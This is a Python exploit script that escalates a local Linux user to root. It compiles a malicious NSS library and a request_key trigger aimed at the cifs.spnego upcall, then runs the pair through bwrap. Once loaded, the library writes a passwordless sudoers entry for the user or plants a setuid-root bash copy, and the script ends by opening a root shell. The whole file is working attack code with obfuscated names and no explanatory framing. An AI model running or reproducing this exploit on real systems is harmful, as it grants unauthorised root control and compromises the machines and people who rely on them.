#!/usr/bin/env python3
import json
import os
import pwd
import re
import shlex
import shutil
import stat
import subprocess
import sys
import textwrap
import time
from pathlib import Path


def _h():
    import hashlib
    return 'a' + hashlib.md5(str(time.time_ns()).encode()).hexdigest()[:7]


_T = "%s_%s" % (os.getuid(), os.getpid())
_W = Path("/tmp") / ("ses-%s" % _T)
_F = _W / "lib"
_N = _W / "nc.conf"
_E = Path("/tmp/.ev_%s" % _T)
_R = Path("/var/tmp/.rs_%s" % _T)
_U = ["unshare", "-Ur", "-m"]
_BWRAP = "bwrap"

_EV_LOADED = "L"
_EV_OK = "OK1"
_EV_FB = "OK2"

LIBNSS_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define P1 @@EVIDENCE_PATH@@
#define P2 @@SUDOERS_PATH@@
#define P3 @@SUDOERS_USER@@
#define P4 @@ROOT_SHELL_PATH@@
#define P5 @@EV_OK@@
#define P6 @@EV_FB@@
#define P7 @@EV_LOADED@@

static void wa(int a, const char *b, size_t c) {
    while (c) {
        ssize_t r = write(a, b, c);
        if (r <= 0) return;
        b += r; c -= (size_t)r;
    }
}

static void fb(int fd) {
    int i, o, rc, e;
    char buf[8192];
    ssize_t n;
    i = open("/bin/bash", O_RDONLY | O_CLOEXEC);
    if (i < 0) return;
    o = open(P4, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
    if (o < 0) { close(i); return; }
    while ((n = read(i, buf, sizeof(buf))) > 0) wa(o, buf, (size_t)n);
    fchown(o, 0, 0);
    fchmod(o, 04755);
    fsync(o); close(o); close(i);
    if (fd >= 0) dprintf(fd, "%s\n", P6);
}

__attribute__((constructor))
static void init(void) {
    int fd, sf, rc;
    const char *hdr = "# x\n";
    fd = open(P1, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
    if (fd >= 0) { dprintf(fd, "%s uid=%d euid=%d\n", P7, getuid(), geteuid()); }
    mkdir("/etc/sudoers.d", 0755);
    sf = open(P2, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0440);
    if (sf < 0) {
        fb(fd);
        if (fd >= 0) close(fd);
        return;
    }
    wa(sf, hdr, strlen(hdr));
    dprintf(sf, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", P3);
    fchmod(sf, 0440); fsync(sf); close(sf);
    if (fd >= 0) { dprintf(fd, "%s\n", P5); close(fd); }
}

enum nss_status @@NSS_FUNC@@(uid_t uid, struct passwd *pw,
                              char *buf, size_t len, int *err) {
    const char *n = "root", *g = "root", *d = "/root", *s = "/bin/bash";
    size_t need = strlen(n) + strlen(g) + strlen(d) + strlen(s) + 4;
    char *p = buf;
    if (len < need) { *err = ERANGE; return NSS_STATUS_TRYAGAIN; }
    strcpy(p, n); pw->pw_name = p; p += strlen(p) + 1;
    strcpy(p, g); pw->pw_gecos = p; p += strlen(p) + 1;
    strcpy(p, d); pw->pw_dir = p; p += strlen(p) + 1;
    strcpy(p, s); pw->pw_shell = p;
    pw->pw_passwd = (char *)"x";
    pw->pw_uid = uid; pw->pw_gid = 0; *err = 0;
    return NSS_STATUS_SUCCESS;
}
'''

TRIGGER_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(void) {
    char desc[768]; long r;

    fprintf(stderr, "[T] pid=%d uid=%d euid=%d\n", getpid(), getuid(), geteuid());

    errno = 0;
    r = syscall(250, 1, "x", 0, 0, 0);
    fprintf(stderr, "[T] keyring rc=%ld errno=%d\n", r, errno);

    snprintf(desc, sizeof(desc),
        "ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;"
        "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
        getpid());
    errno = 0;
    r = syscall(249, "cifs.spnego", desc, "", -3);
    fprintf(stderr, "[T] request_key rc=%ld errno=%d (%s)\n", r, errno, strerror(errno));

    sleep(3);
    fprintf(stderr, "[T] done\n");
    return 0;
}
'''


def _join(cmd):
    return " ".join(shlex.quote(str(a)) for a in cmd)


def _run(cmd, check=True, cwd=None):
    c = subprocess.run(
        [str(a) for a in cmd],
        cwd=str(cwd) if cwd else None,
        universal_newlines=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    if c.stdout:
        print(c.stdout, end="", flush=True)
    if check and c.returncode != 0:
        raise SystemExit("failed: %s (exit %s)" % (_join(cmd), c.returncode))
    return c


def _runq(cmd, cwd=None):
    return subprocess.run(
        [str(a) for a in cmd],
        cwd=str(cwd) if cwd else None,
        universal_newlines=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )


def _wt(path, content):
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")


def _cstr(v):
    return json.dumps(str(v))


def _user():
    if os.getuid() == 0:
        raise SystemExit("failed: run as unprivileged user")
    u = pwd.getpwuid(os.getuid()).pw_name
    if not re.match(r"^[A-Za-z0-9_.-]+[$]?$", u):
        raise SystemExit("failed: bad username")
    return u


def _libdirs():
    cands = [Path("/usr/lib64"), Path("/lib64"),
             Path("/lib/x86_64-linux-gnu"), Path("/usr/lib/x86_64-linux-gnu")]
    found, seen = [], set()
    for c in cands:
        if not (c / "libnss_files.so.2").exists():
            continue
        r = c.resolve()
        if str(r) not in seen:
            seen.add(str(r))
            found.append(r)
    if not found:
        raise SystemExit("failed: no lib dir")
    return found


def _nsexist():
    for p in [Path("/etc/nsswitch.conf"), Path("/usr/etc/nsswitch.conf")]:
        if p.exists():
            return
    raise SystemExit("failed: no nsswitch")


def _chkcmds():
    miss = [c for c in ["bash", "gcc", "mount", "sudo", "unshare"]
            if shutil.which(c) is None]
    if miss:
        raise SystemExit("failed: missing: %s" % ", ".join(miss))


def _userns():
    if _runq(_U + ["true"]).returncode == 0:
        return list(_U)
    aa = shutil.which("aa-exec")
    if aa:
        fb = ["aa-exec", "-p", "trinity", "--"] + _U
        if _runq(fb + ["true"]).returncode == 0:
            return fb
    raise SystemExit("failed: no userns")


def _chkrk():
    paths = [Path("/etc/request-key.conf"), Path("/etc/request-key.d")]
    active = []
    for p in paths:
        fs = [p]
        if p.is_dir():
            fs = sorted(c for c in p.iterdir() if c.is_file())
        for f in fs:
            try:
                lines = f.read_text(encoding="utf-8", errors="replace").splitlines()
            except (IOError, OSError):
                continue
            for ln in lines:
                s = ln.strip()
                if s and not s.startswith("#") and "cifs.spnego" in s:
                    active.append(s)
    if not active:
        raise SystemExit("failed: no spnego rule")
    if not any("cifs.upcall" in a for a in active):
        raise SystemExit("failed: no upcall rule")


def _cifs():
    try:
        data = Path("/proc/filesystems").read_text(encoding="utf-8", errors="replace")
    except (IOError, OSError):
        return False
    return any(l.split()[-1:] == ["cifs"] for l in data.splitlines())


def _chkexec():
    p = _W / "p.sh"
    _wt(p, "#!/bin/sh\nexit 0\n")
    p.chmod(0o700)
    try:
        c = _runq([str(p)])
    except OSError:
        raise SystemExit("failed: noexec")
    if c.returncode != 0:
        raise SystemExit("failed: exec probe")


def _render(user, spath, nname):
    s = LIBNSS_SOURCE
    s = s.replace("@@EVIDENCE_PATH@@", _cstr(_E))
    s = s.replace("@@SUDOERS_PATH@@", _cstr(spath))
    s = s.replace("@@SUDOERS_USER@@", _cstr(user))
    s = s.replace("@@ROOT_SHELL_PATH@@", _cstr(_R))
    s = s.replace("@@EV_OK@@", _cstr(_EV_OK))
    s = s.replace("@@EV_FB@@", _cstr(_EV_FB))
    s = s.replace("@@EV_LOADED@@", _cstr(_EV_LOADED))
    s = s.replace("@@NSS_FUNC@@", "_nss_%s_getpwuid_r" % nname)
    return s


def _sudochk():
    c = subprocess.run(
        ["sudo", "-n", "/bin/bash", "-p", "-c", "id -u"],
        universal_newlines=True, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, check=False,
    )
    return c.returncode == 0 and c.stdout.strip() == "0"


def _evidence():
    if not _E.exists():
        return ""
    return _E.read_text(encoding="utf-8", errors="replace")


def _chkfb():
    try:
        st = _R.stat()
    except FileNotFoundError:
        raise SystemExit("failed: no fallback shell")
    if st.st_uid != 0 or not (st.st_mode & stat.S_ISUID):
        raise SystemExit("failed: bad fallback perms")


def _wsfb(user, spath):
    _chkfb()
    cmd = (
        "printf '%%s\\n' '# x' %s > %s; "
        "chown root:root %s; chmod 0440 %s"
    ) % (
        shlex.quote("%s ALL=(ALL:ALL) NOPASSWD: ALL" % user),
        shlex.quote(str(spath)),
        shlex.quote(str(spath)),
        shlex.quote(str(spath)),
    )
    _run([str(_R), "-p", "-c", cmd], check=True)


def _load_cifs_module():
    if _cifs():
        print("[DBG] cifs module already loaded", flush=True)
        return True

    print("[DBG] cifs module not loaded, trying to load...", flush=True)

    _runq(["modprobe", "cifs"])
    if _cifs():
        print("[DBG] modprobe cifs succeeded", flush=True)
        return True

    import tempfile
    tmp = tempfile.mkdtemp(prefix=".m_")
    _runq(["mount", "-t", "cifs", "//127.0.0.1/nonexist", tmp, "-o", "guest,vers=3.0"])
    os.rmdir(tmp)
    if _cifs():
        print("[DBG] cifs module loaded via mount attempt", flush=True)
        return True

    _runq(["modprobe", "cifs"])
    time.sleep(0.5)
    if _cifs():
        print("[DBG] cifs module loaded on retry", flush=True)
        return True

    print("[DBG] WARNING: cifs module could not be loaded!", flush=True)
    print("[DBG] /proc/filesystems:", flush=True)
    try:
        data = Path("/proc/filesystems").read_text()
        for line in data.splitlines():
            if "cifs" in line.lower() or "smb" in line.lower():
                print("[DBG]   %s" % line, flush=True)
    except Exception:
        pass

    print("[DBG] checking available modules:", flush=True)
    c = _runq(["find", "/lib/modules", "-name", "*cifs*", "-o", "-name", "*smb*"])
    if c.stdout.strip():
        print(c.stdout, flush=True)
    else:
        print("[DBG]   no cifs/smb kernel modules found on disk!", flush=True)

    return False


def main():
    _chkcmds()
    user = _user()
    spath = Path("/etc/sudoers.d/s-%s" % _T)
    ldirs = _libdirs()
    _nsexist()

    if _sudochk():
        raise SystemExit("failed: already root")
    if not shutil.which(_BWRAP):
        raise SystemExit("failed: bwrap not found")
    _chkrk()

    cifs_ok = _load_cifs_module()
    if not cifs_ok:
        print("[DBG] WARNING: continuing without cifs module - request_key will fail", flush=True)
        print("[DBG] only direct getpwuid path available (fake root in userns)", flush=True)

    shutil.rmtree(str(_W), ignore_errors=True)
    _F.mkdir(parents=True)
    _chkexec()

    nn = _h()
    libnss_so = "libnss_%s.so.2" % nn

    _wt(_W / "a.c", _render(user, spath, nn))
    _wt(_W / "b.c", TRIGGER_SOURCE)
    _wt(_N, """
        passwd: %s files
        group: files
        shadow: files
        hosts: files dns
    """ % nn)

    _run(["gcc", "-shared", "-fPIC", "-Wno-all", "-o",
          "lib/%s" % libnss_so, "a.c"], cwd=_W)
    bn = _h()
    _run(["gcc", "-Wno-all", "-o", bn, "b.c"], cwd=_W)

    _runq(["killall", "-9", "nscd"])
    print("[DBG] cifs module loaded: %s" % cifs_ok, flush=True)

    bwrap_cmd = [
        _BWRAP,
        "--dev-bind", "/", "/",
        "--bind", str(_N), "/etc/nsswitch.conf",
    ]
    for d in ldirs:
        bwrap_cmd += ["--bind", str(_F), str(d)]
    if Path("/run/nscd").is_dir():
        bwrap_cmd += ["--tmpfs", "/run/nscd"]
    if Path("/var/run/nscd").is_dir():
        bwrap_cmd += ["--tmpfs", "/var/run/nscd"]
    bwrap_cmd += ["--", str(_W / bn)]

    print("[DBG] bwrap command: %s" % _join(bwrap_cmd), flush=True)
    _run(bwrap_cmd, cwd=_W, check=True)
    time.sleep(1)

    ev = _evidence()
    print("[DBG] evidence: %r" % ev, flush=True)

    if not ev:
        if not _cifs():
            print("\n[!] cifs kernel module is NOT loaded.", flush=True)
            print("[!] request_key cannot dispatch to cifs.upcall without it.", flush=True)
            print("[!] Try: sudo modprobe cifs", flush=True)
            print("[!] Or check: find /lib/modules/$(uname -r) -name '*cifs*'", flush=True)
        raise SystemExit("failed: module never loaded (empty evidence)")

    if _EV_OK in ev:
        print("[DBG] sudoers entry written successfully!", flush=True)
    elif _EV_FB in ev:
        if "uid=0 euid=0" in ev and not cifs_ok:
            print("\n[!] Constructor ran as FAKE root (uid=0 in user namespace only).", flush=True)
            print("[!] This means cifs.upcall never ran as real root.", flush=True)
            print("[!] The fallback shell was created but owned by your real uid, not root.", flush=True)
            print("[!] Need cifs kernel module loaded for real root escalation.", flush=True)

            print("\n[DBG] Checking fallback shell anyway...", flush=True)
            try:
                st = _R.stat()
                print("[DBG] %s: uid=%d gid=%d mode=%o" % (_R, st.st_uid, st.st_gid, stat.S_IMODE(st.st_mode)), flush=True)
            except FileNotFoundError:
                print("[DBG] fallback shell not found", flush=True)

            raise SystemExit(
                "failed: cifs module not loaded -> only fake root available.\n"
                "Fix: load cifs module first (sudo modprobe cifs), then re-run."
            )
        _wsfb(user, spath)
    elif _EV_LOADED in ev:
        print("[DBG] module loaded but neither sudoers nor fallback succeeded", flush=True)
        print("[DBG] evidence:\n%s" % ev, flush=True)
        raise SystemExit("failed: module loaded, no privesc path succeeded")
    else:
        raise SystemExit("failed: unexpected evidence content: %r" % ev)

    if not _sudochk():
        raise SystemExit("failed: sudo check")

    os.execvp("sudo", ["sudo", "-n", "/bin/bash", "-p"])


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
